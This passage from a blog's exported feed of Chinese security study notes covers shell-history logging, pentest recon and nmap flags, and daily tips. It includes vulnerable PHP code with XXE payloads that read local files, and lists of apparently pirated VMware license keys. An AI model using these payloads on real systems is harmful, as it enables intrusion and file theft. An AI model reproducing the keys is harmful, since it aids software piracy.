<h4 id="记录所有用户登录操作日志"><a href="#记录所有用户登录操作日志" class="headerlink" title="记录所有用户登录操作日志"></a>记录所有用户登录操作日志</h4><p>通过脚本代码实现记录所有用户的登录操作日志，防止出现安全事件后无据可查。</p>
<p>1、运行 [root@xxx /]# vim /etc/profile打开配置文件。</p>
<p>2、在配置文件中输入以下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">history</span><br><span class="line">     </span><br><span class="line">USER&#x3D;&#96;whoami&#96;</span><br><span class="line">     </span><br><span class="line">USER_IP&#x3D;&#96;who -u am i 2&gt;&#x2F;dev&#x2F;null| awk &#39;&#123;print $NF&#125;&#39;|sed -e &#39;s&#x2F;[()]&#x2F;&#x2F;g&#39;&#96;</span><br><span class="line">     </span><br><span class="line">if [ &quot;$USER_IP&quot; &#x3D; &quot;&quot; ]; then</span><br><span class="line">     </span><br><span class="line">USER_IP&#x3D;&#96;hostname&#96;</span><br><span class="line">     </span><br><span class="line">fi</span><br><span class="line">     </span><br><span class="line">if [ ! -d &#x2F;var&#x2F;log&#x2F;history ]; then</span><br><span class="line">     </span><br><span class="line">mkdir &#x2F;var&#x2F;log&#x2F;history</span><br><span class="line">     </span><br><span class="line">chmod 777 &#x2F;var&#x2F;log&#x2F;history</span><br><span class="line">     </span><br><span class="line">fi</span><br><span class="line">     </span><br><span class="line">if [ ! -d &#x2F;var&#x2F;log&#x2F;history&#x2F;$&#123;LOGNAME&#125; ]; then</span><br><span class="line">     </span><br><span class="line">mkdir &#x2F;var&#x2F;log&#x2F;history&#x2F;$&#123;LOGNAME&#125;</span><br><span class="line">     </span><br><span class="line">chmod 300 &#x2F;var&#x2F;log&#x2F;history&#x2F;$&#123;LOGNAME&#125;</span><br><span class="line">     </span><br><span class="line">fi</span><br><span class="line">     </span><br><span class="line">export HISTSIZE&#x3D;4096</span><br><span class="line">     </span><br><span class="line">DT&#x3D;&#96;date +&quot;%Y%m%d_%H:%M:%S&quot;&#96;</span><br><span class="line">     </span><br><span class="line">export HISTFILE&#x3D;&quot;&#x2F;var&#x2F;log&#x2F;history&#x2F;$&#123;LOGNAME&#125;&#x2F;$&#123;USER&#125;@$&#123;USER_IP&#125;_$DT&quot;</span><br><span class="line">     </span><br><span class="line">chmod 600 &#x2F;var&#x2F;log&#x2F;history&#x2F;$&#123;LOGNAME&#125;&#x2F;*history* 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
<p>3、运行 [root@xxx /]# source /etc/profile 加载配置生效。</p>
<p>注意： /var/log/history 是记录日志的存放位置，可以自定义。</p>
<p>通过上述步骤，可以在 /var/log/history 目录下以每个用户为名新建一个文件夹，每次用户退出后都会产生以用户名、登录IP、时间的日志文件，包含此用户本次的所有操作（root用户除外）。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>hxxps://www.[alibabacloud.com/help/zh/faq-detail/49809.htm?spm=a2c63.q38357.a3.2.442e847fJWURzi</p>
]]></content>
      <categories>
        <category>Linux系统安全</category>
      </categories>
      <tags>
        <tag>Linux加固</tag>
      </tags>
  </entry>
  <entry>
    <title>PTE理论1</title>
    <url>/2020/07/16/PTE%E7%90%86%E8%AE%BA1/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h1 id="PTE理论1"><a href="#PTE理论1" class="headerlink" title="PTE理论1"></a>PTE理论1</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h4 id="信息收集概述"><a href="#信息收集概述" class="headerlink" title="信息收集概述"></a>信息收集概述</h4><p>黑客在攻击前、过程中对目标所进行的探测活动。</p>
<p>信息收集的作用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">缩小攻击范围</span><br><span class="line">了解架构安全</span><br><span class="line">建立信息数据库</span><br><span class="line">描绘网络拓扑</span><br></pre></td></tr></table></figure>
<p>信息收集分类</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">主动信息收集</span><br><span class="line">被动信息收集</span><br></pre></td></tr></table></figure>
<p>信息收集内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">网络信息：域名、控制策略、开放端口、协议、防火墙、认证机制、VPN接入点、IP地址、网段</span><br><span class="line">系统信息：系统banner、目录、临时文件、路由表、系统架构</span><br><span class="line">组织信息：组织背景、员工信息、邮箱&#x2F;电话、地址、官网</span><br></pre></td></tr></table></figure>
<p>主动信息收集</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netbios枚举</span><br><span class="line">SNMP枚举</span><br><span class="line">Linux枚举</span><br><span class="line">LDAP枚举</span><br><span class="line">ntp枚举</span><br><span class="line">smtp枚举</span><br><span class="line">DNS枚举</span><br></pre></td></tr></table></figure>
<h4 id="whois信息"><a href="#whois信息" class="headerlink" title="whois信息"></a>whois信息</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">域名信息</span><br><span class="line">所有者联系方式</span><br><span class="line">域名服务器</span><br><span class="line">网站IP范围</span><br><span class="line">域名创建时间</span><br><span class="line">过期记录</span><br><span class="line">最近更新记录</span><br></pre></td></tr></table></figure>
<p>DNS资源记录类型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A记录</span><br><span class="line">CNAME</span><br><span class="line">NS</span><br><span class="line">PTR</span><br><span class="line">MX</span><br></pre></td></tr></table></figure>
<p>DNS查询</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kali自带nslookup</span><br><span class="line">dig</span><br></pre></td></tr></table></figure>
<p>确定地址范围作用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">协助绘制目标网络拓扑图</span><br><span class="line">使用ARIN whois database search 工具找到IP地址范围</span><br><span class="line">通过区域因特网注册机构找到IP地址范围和目标子网掩码</span><br></pre></td></tr></table></figure>
<h4 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h4><p>用途</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口探测</span><br><span class="line">主机探测</span><br><span class="line">系统探测</span><br><span class="line">版本探测</span><br></pre></td></tr></table></figure>
<p>常用参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-v 详细</span><br><span class="line">-p 指定端口范围</span><br><span class="line">-O 操作系统识别</span><br><span class="line">-A 全面检测</span><br><span class="line">-sV 探测端口-服务器版本</span><br><span class="line">-sA ACK扫描-探测防火墙</span><br><span class="line">-sP ping扫描-快速扫描</span><br><span class="line">-sS TCP SYN半开放扫描-隐蔽扫描</span><br><span class="line">-sT 全连接扫描-防火墙会留日志</span><br><span class="line">-sU UDP扫描-确定端口开放</span><br></pre></td></tr></table></figure>
<p>常用扫描参数示例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">半开放扫描全端口：nmap -sS -p 1-65535 -v ip&#x2F;url</span><br><span class="line"></span><br><span class="line">扫描C段存活主机：nmap -sP ip&#x2F;url</span><br><span class="line"></span><br><span class="line">指定端口扫描：nmap -p 80 ip&#x2F;url</span><br><span class="line"></span><br><span class="line">扫描主机操作系统：nmap -O ip&#x2F;url</span><br><span class="line"></span><br><span class="line">主机详细扫描：nmap -A -v IP&#x2F;url</span><br><span class="line"></span><br><span class="line">穿透防火墙扫描：</span><br><span class="line">nmap -Pn -A ip&#x2F;url</span><br><span class="line">nmap -sS -T4 ip&#x2F;url</span><br><span class="line">nmap -sF -T4 ip&#x2F;url</span><br><span class="line">nmap -sA -T4 ip&#x2F;url</span><br></pre></td></tr></table></figure>
<h4 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h4><p>大部分应用组件存在说明当前服务名称和版本的特征，识别这些特征即可获取当前服务信息。</p>
<p>web架构</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">大多数web组件可以粗略的分为三个组件：</span><br><span class="line">客户端</span><br><span class="line">服务端</span><br><span class="line">后端存储，一般是DBMS，用于查询和存储数据</span><br></pre></td></tr></table></figure>
<p>客户端技术</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">客户端技术包括html、falsh、javascript。。。</span><br></pre></td></tr></table></figure>
<p>服务端技术</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">web服务器：Apache、Nginx、IIS、linghttpd。。。</span><br><span class="line">应用服务器：tomcat、jboss、Oracle。。。。</span><br><span class="line">编程语言：PHP、java、ruby、Python、C#</span><br></pre></td></tr></table></figure>
<p>后端存储技术</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">中小型网站，一般数据库和web服务器在同一台服务器上。</span><br><span class="line">关系型数据库：Mysql、Oracle、DB2、SQL Server、Postgresql、Sqlite。。。</span><br><span class="line">NOSQL：MongoDB、CouchDB、Redis。。。</span><br><span class="line"></span><br><span class="line">目录访问：openLDAP、Active Directory</span><br></pre></td></tr></table></figure>
<p>常见的web应用指纹识别</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">特殊文件的MD5值匹配</span><br><span class="line">请求响应主体内容或头信息的关键字匹配</span><br><span class="line">请求响应主体内容或头信息的正则匹配</span><br><span class="line">基于url关键字识别</span><br><span class="line">基于TCP&#x2F;IP请求协议识别服务指纹</span><br></pre></td></tr></table></figure>
<p>手工检测恶意指纹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP分析：</span><br><span class="line">1.观察响应头的server、X-forward-by、cookie字段</span><br><span class="line">2.使用畸形的host字段的HTTP请求试探，观察响应头</span><br><span class="line"></span><br><span class="line">网站的HTML源码</span><br></pre></td></tr></table></figure>
<p>根据网站页面后缀判断</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">存在.php结尾的文件说明该web应用是用PHP写的；</span><br><span class="line">存在.jsp或.do的文件，说明该web应用是用java写的；</span><br><span class="line">存在.asp或.aspx结尾的文件，说明该web应用可能是由vb或C#写的</span><br></pre></td></tr></table></figure>
<p>浏览网站favicon.ico</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可以通过默认favicon.ico来判断CMS</span><br></pre></td></tr></table></figure>
<p>robots.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">有些cms会有默认的robots.txt，可以通过robots.txt来判断CMS</span><br></pre></td></tr></table></figure>
<p>刻意构造错误</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">错误页面可以提供关于服务器的大量信息，可以构造错误来尝试得到404界面。</span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/16/PTE%E7%90%86%E8%AE%BA1/image-20200716103839018.png" alt="image-20200716103839018"></p>
<p>自动化指纹分析工具</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whatweb</span><br><span class="line">wappalyzer</span><br><span class="line">天蝎指纹库</span><br><span class="line">plecost</span><br><span class="line">website analyzer</span><br><span class="line">cms-explorer</span><br><span class="line">shodan&#x2F;fofa&#x2F;zoomeye&#x2F;傻蛋</span><br></pre></td></tr></table></figure>
<h4 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">窃听</span><br><span class="line">肩窥</span><br><span class="line">垃圾搜寻</span><br><span class="line">社交模仿</span><br></pre></td></tr></table></figure>
<p>社交网络SNS</p>
<p><img src="/2020/07/16/PTE%E7%90%86%E8%AE%BA1/image-20200716111209068.png" alt="image-20200716111209068"></p>
<h2 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h2><h4 id="渗透测试分类"><a href="#渗透测试分类" class="headerlink" title="渗透测试分类"></a>渗透测试分类</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">黑盒测试</span><br><span class="line">白盒测试</span><br><span class="line">灰盒测试</span><br></pre></td></tr></table></figure>
<h4 id="渗透测试过程"><a href="#渗透测试过程" class="headerlink" title="渗透测试过程"></a>渗透测试过程</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">前期交互阶段</span><br><span class="line">情报收集阶段</span><br><span class="line">威胁建模阶段</span><br><span class="line">漏洞分析阶段</span><br><span class="line">渗透攻击阶段</span><br><span class="line">后渗透攻击阶段</span><br><span class="line">完成报告</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>PTE</category>
      </categories>
      <tags>
        <tag>PTE</tag>
      </tags>
  </entry>
  <entry>
    <title>日常问题解决</title>
    <url>/2020/07/16/%E6%97%A5%E5%B8%B8%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h1 id="日常小知识"><a href="#日常小知识" class="headerlink" title="日常小知识"></a>日常小知识</h1><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><h4 id="校验MD5"><a href="#校验MD5" class="headerlink" title="校验MD5"></a>校验MD5</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CertUtil -hashfile D:\XXX\XX\XXXXXXX.iso MD5</span><br></pre></td></tr></table></figure>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h4 id="kali设置中文"><a href="#kali设置中文" class="headerlink" title="kali设置中文"></a>kali设置中文</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install locales</span><br><span class="line">apt install ttf-wqy-zenhei</span><br><span class="line">apt install xfonts-intl-chinese</span><br><span class="line">dpkg-reconfigure locales</span><br></pre></td></tr></table></figure>
<p>选中下面三个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">en_US.UTF-8</span><br><span class="line">zh_CN.UTF-8</span><br><span class="line">zh_CN.GBK</span><br></pre></td></tr></table></figure>
<p>接着选择字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zh_CN.UTF-8</span><br></pre></td></tr></table></figure>
<p>然后reboot</p>
<h4 id="kali使用全局代理"><a href="#kali使用全局代理" class="headerlink" title="kali使用全局代理"></a>kali使用全局代理</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;proxychains.conf</span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/16/%E6%97%A5%E5%B8%B8%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/image-20200727104600146.png" alt="image-20200727104600146"></p>
<p>在需要代理的命令前加上 proxychains</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains curl https:&#x2F;&#x2F;www.xx.xxx.xx</span><br></pre></td></tr></table></figure>
<h4 id="Ubuntu普通用户改root用户"><a href="#Ubuntu普通用户改root用户" class="headerlink" title="Ubuntu普通用户改root用户"></a>Ubuntu普通用户改root用户</h4><p>首先安装编辑器gedit</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install gedit</span><br></pre></td></tr></table></figure>
<p>然后编辑/etc/passwd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo gedit &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
<p>将想要修改的用户的ID，一般为<code>1000:1000</code>,改为root用户ID<code>0:0</code></p>
<p>保存退出，重启即可。</p>
<h4 id="Ubuntu安装vmware-tool"><a href="#Ubuntu安装vmware-tool" class="headerlink" title="Ubuntu安装vmware tool"></a>Ubuntu安装vmware tool</h4><p>虚拟机点击安装vmware tool，在桌面上会自动出现CD标志，进入进入其中，会发现无法对VM***.tar.gz进行操作，显示只读。</p>
<p>解决方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.拖动VM***.tar.gz至桌面，tar zxvf VM***.tar.gz即可</span><br><span class="line">2.进入解压后的文件夹，执行</span><br><span class="line">chmod +x vmware-install.pl</span><br><span class="line">sudo .&#x2F;vmware-install.pl</span><br><span class="line">3.选择yes，一路回车，提示yes输入yes即可，最后reboot</span><br></pre></td></tr></table></figure>
<h2 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h2><h4 id="VMware激活"><a href="#VMware激活" class="headerlink" title="VMware激活"></a>VMware激活</h4><p>VMware Workstation Pro 15 激活密钥许可证</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UY758-0RXEQ-M81WP-8ZM7Z-Y3HDA</span><br><span class="line">VF750-4MX5Q-488DQ-9WZE9-ZY2D6</span><br><span class="line">UU54R-FVD91-488PP-7NNGC-ZFAX6</span><br><span class="line">YC74H-FGF92-081VZ-R5QNG-P6RY4</span><br><span class="line">YC34H-6WWDK-085MQ-JYPNX-NZRA2</span><br><span class="line">ZC10K-8EF57-084QZ-VXYXE-ZF2XF</span><br><span class="line">UF71K-2TW5J-M88QZ-8WMNT-WKUY4</span><br><span class="line">AZ7MK-44Y1J-H819Z-WMYNC-N7ATF</span><br><span class="line">CU702-DRD1M-H89GP-JFW5E-YL8X6</span><br><span class="line">YY5EA-00XDJ-480RP-35QQV-XY8F6</span><br><span class="line">VA510-23F57-M85PY-7FN7C-MCRG0</span><br><span class="line">VC1J8-0TX11-M84WP-2WNGX-PQKD8</span><br><span class="line">AA7EU-FUE97-4896Q-3WYZC-WYKY0</span><br><span class="line">ZY7EU-2JG01-H8EDZ-9NYNX-ZVHW0</span><br><span class="line">AZ312-2FE41-M81LP-R6WEZ-NA2Z4</span><br><span class="line">AU71H-0VE44-M81DZ-77Y5C-QG0G4</span><br><span class="line">ZA7HK-AWFE2-M80AY-KDNZG-XQ2X8</span><br><span class="line">CA58K-DDF13-H88PY-VWN7V-XKHW2</span><br><span class="line">GV10H-A4E02-H84VY-JXYEV-NAATD</span><br><span class="line">VA71K-83Y55-H88NP-JWZEG-YYK92</span><br><span class="line">FY3JH-6XGEN-088HZ-95WET-QCKVD</span><br><span class="line">VG5HH-D6E04-0889Y-QXZET-QGUC8</span><br><span class="line">CY55A-F6G80-H85HQ-WNN5X-W38W4</span><br><span class="line">AC11H-4HZ05-08EDQ-APQGX-YCUC8</span><br><span class="line">ZG780-8EZ9M-M89LY-M5PEG-W2AZ8</span><br><span class="line">ZF3NU-D6XEJ-48E7Q-27YNC-PC8ED</span><br><span class="line">AV5M0-F4W8M-088PZ-36ZNV-NFHE2</span><br><span class="line">AU15R-A0Z4N-M88HY-HQYNX-QYKD6</span><br><span class="line">VY110-4RD50-H886P-5FMN9-WPUUD</span><br><span class="line">GF302-4HW44-H88DQ-WZXNV-Q3R94</span><br><span class="line">UA752-0KF9J-0811Y-MQNEX-ZUAGF</span><br></pre></td></tr></table></figure>
<p>VMware Workstation Pro 14 激活密钥许可证</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AC5XK-0ZD4H-088HP-9NQZV-ZG2R4</span><br><span class="line">FF590-2DX83-M81LZ-XDM7E-MKUT4</span><br><span class="line">CG54H-D8D0H-H8DHY-C6X7X-N2KG6</span><br><span class="line">ZC3WK-AFXEK-488JP-A7MQX-XL8YF</span><br><span class="line">AA702-81D8N-0817Y-75PQT-Q70A4</span><br><span class="line">YC592-8VF55-M81AZ-FWW5T-WVRV0</span><br><span class="line">FC78K-FKED6-H88LZ-0QPEE-QP8X6</span><br><span class="line">UV1H2-AKWD2-H8EJZ-GGMEE-PCATD</span><br><span class="line">AC310-0VG0P-M88CQ-YWY5Z-QPRG0</span><br><span class="line">FF31K-AHZD1-H8ETZ-8WWEZ-WUUVA</span><br><span class="line">CV7T2-6WY5Q-48EWP-ZXY7X-QGUWD</span><br></pre></td></tr></table></figure>
<p>VMware Workstation Pro 12 激活密钥许可证</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5A02H-AU243-TZJ49-GTC7K-3C61N</span><br><span class="line">VF5XA-FNDDJ-085GZ-4NXZ9-N20E6</span><br><span class="line">UC5MR-8NE16-H81WY-R7QGV-QG2D8</span><br><span class="line">ZG1WH-ATY96-H80QP-X7PEX-Y30V4</span><br><span class="line">AA3E0-0VDE1-0893Z-KGZ59-QGAVF</span><br><span class="line">VU1XA-DGE5L-080NZ-LQNNG-MY2R8</span><br><span class="line">YZ5N2-F4E96-485HY-4WPXV-XQ2Z8</span><br><span class="line">YZ54H-A3G5N-4815Y-J6P79-QG0G8</span><br><span class="line">YZ3R0-6EDE0-M89HZ-4YZEC-NUAU8</span><br></pre></td></tr></table></figure>
<p>VMware Workstation Pro 11 激活密钥许可证</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1F04Z-6D111-7Z029-AV0Q4-3AEH8</span><br></pre></td></tr></table></figure>
<p>VMware Workstation Pro 10 激活密钥许可证</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1Z0G9-67285-FZG78-ZL3Q2-234JG</span><br><span class="line">4C4EK-89KDL-5ZFP9-1LA5P-2A0J0</span><br><span class="line">HY086-4T01N-CZ3U0-CV0QM-13DNU</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>问题解决</category>
      </categories>
      <tags>
        <tag>日常踩坑</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE漏洞</title>
    <url>/2020/08/01/XXE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.XML</span><br><span class="line">XML被设计用来传输和存储数据。XML文档形成了一种树结构，从‘根部’开始，然后扩展到‘枝叶’。</span><br><span class="line">XML允许创作者定义自己的标签和自己的文档结构。</span><br><span class="line"></span><br><span class="line">XML示例：</span><br><span class="line">&lt;?xml version&#x3D;&#39;1.0&#39; encoding&#x3D;&#39;UTF-8&#39;?&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;love&lt;&#x2F;to&gt;</span><br><span class="line">&lt;from&gt;jan&lt;&#x2F;from&gt;</span><br><span class="line">&lt;heading&gt;reminder&lt;&#x2F;heading&gt;</span><br><span class="line">&lt;body&gt;don&#39;t&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br><span class="line"></span><br><span class="line">2.XML语法规则</span><br><span class="line">所有的xml元素都必须有一个关闭标签</span><br><span class="line">XML标签对大小写敏感</span><br><span class="line">XML必须正确嵌套</span><br><span class="line">XML属性值必须加引号</span><br><span class="line">实体引用</span><br><span class="line">在XML中，空格被保留</span><br><span class="line"></span><br><span class="line">3.XML元素介绍</span><br><span class="line">XML元素指的是从（且包括）开始标签直到（且包括）结束标签的部分。</span><br><span class="line">每个元素又可以有对应的属性。XML属性必须加引号</span><br><span class="line"></span><br><span class="line">4.XML DTD</span><br><span class="line">拥有正确语法的XML被称为‘形式良好’的XML。通过DTD验证的XML是’合法‘的XML。</span><br><span class="line">&lt;!DOCTYPE note</span><br><span class="line">[</span><br><span class="line">&lt;!ELEMENT note(to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading(#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body(#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
<h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.DTD声明类型</span><br><span class="line">内部的DOCTYPE声明：&lt;!DOCTYPE root-element [element-declartions]&gt;</span><br><span class="line"></span><br><span class="line">外部文档声明：加入DTD位于XML源文件的外部，那么它应通过被封装在一个DOCTYPE定义中：</span><br><span class="line">&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt;</span><br><span class="line"></span><br><span class="line">2.DTD数据类型</span><br><span class="line">PCDATA 的意思是被解析的字符数据.PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</span><br><span class="line"></span><br><span class="line">CDATA 的意思是字符数据。</span><br><span class="line">CDATA是不会被解析器解析的文本。这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</span><br><span class="line"></span><br><span class="line">3.DTD实体介绍</span><br><span class="line">实体是定义引用普通文本或特殊字符的快捷方式的变量。</span><br><span class="line">内部实体：&lt;!ENTITY entity-name &quot;entity-value&quot;&gt;</span><br><span class="line">外部实体：&lt;!ENTITY entity-name SYSTEM &quot;URI&#x2F;URL&quot;</span><br><span class="line"></span><br><span class="line">4.XML注入产生原理</span><br><span class="line">XXE漏洞全称是XML External Entity Injection即xml外部实体注入漏洞。</span><br><span class="line">XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起DOS攻击等危害。</span><br><span class="line"></span><br><span class="line">XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</span><br></pre></td></tr></table></figure>
<h2 id="XXE漏洞代码简单编写"><a href="#XXE漏洞代码简单编写" class="headerlink" title="XXE漏洞代码简单编写"></a>XXE漏洞代码简单编写</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.file_get_content函数</span><br><span class="line">file_get_contents()函数把整个文件读入到一个字符串中。</span><br><span class="line">参数path是必需，规定要读取的文件。</span><br><span class="line"></span><br><span class="line">2.php:&#x2F;&#x2F;input函数</span><br><span class="line">php:&#x2F;&#x2F;input是一个可以访问请求的原始数据的只读流。</span><br><span class="line">结合file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;)可以读取POST提交的数据。</span><br><span class="line">&lt;?php</span><br><span class="line">$str &#x3D;file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);</span><br><span class="line">echo $str;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">3.simplexml_load_string函数</span><br><span class="line">php中的simplexml_load_string函数将xml格式字符串转换为相应的simpleXMLElement。</span><br><span class="line"></span><br><span class="line">4.XML注入回显</span><br><span class="line">在PHP中可以使用print_r()、echo输出想要输出的内容。</span><br><span class="line">示例完整存在XXE漏洞代码：</span><br><span class="line">&lt;?php</span><br><span class="line">$xml&#x3D;file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);</span><br><span class="line">$data&#x3D;simplexml_load_string($xml);</span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">print_r($data); &#x2F;&#x2F;注释掉该语句即为无回显的情况</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line">读取本地文件payload：</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0 encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe[</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;windows&#x2F;win.ini&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe&lt;&#x2F;name&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
<h2 id="XXE利用-任意文件读取"><a href="#XXE利用-任意文件读取" class="headerlink" title="XXE利用-任意文件读取"></a>XXE利用-任意文件读取</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.XXE漏洞代码</span><br><span class="line">&lt;?php</span><br><span class="line">$xml&#x3D;file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);</span><br><span class="line">$data&#x3D;simplexml_load_string($xml);</span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">print_r($data); &#x2F;&#x2F;注释掉该语句即为无回显的情况</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line">2.PHP中POC</span><br><span class="line">file:&#x2F;&#x2F;&#x2F;path&#x2F;to&#x2F;file.txt</span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;file&#x2F;txt</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encoder&#x2F;resource&#x3D;conf.php</span><br><span class="line"></span><br><span class="line">3.读取本地txt</span><br><span class="line">payload：</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;&#x2F;test&#x2F;flag.txt&quot;&gt;]&gt;</span><br><span class="line">&lt;value&gt; &amp;xxe &lt;&#x2F;value&gt;</span><br><span class="line">通过Burpsuite截断HTTP请求，改为POST方法，将payload放在post的内容页面中，空行。</span><br><span class="line"></span><br><span class="line">4.读取PHP文件</span><br><span class="line">直接利用file协议读取PHP文件会出现错误，则需要使用base64编码来进行读取。</span><br><span class="line">将SYSTEM后的替换为SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encoder&#x2F;resource&#x3D;test.php&quot; 即可</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>PTE理论2</title>
    <url>/2020/07/27/PTE%E7%90%86%E8%AE%BA2/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h1 id="web安全基础知识"><a href="#web安全基础知识" class="headerlink" title="web安全基础知识"></a>web安全基础知识</h1><h4 id="web组件"><a href="#web组件" class="headerlink" title="web组件"></a>web组件</h4><p>web服务器，又称为HTTP服务器，响应来自浏览器的HTTP请求，并且发送网页响应内容。</p>
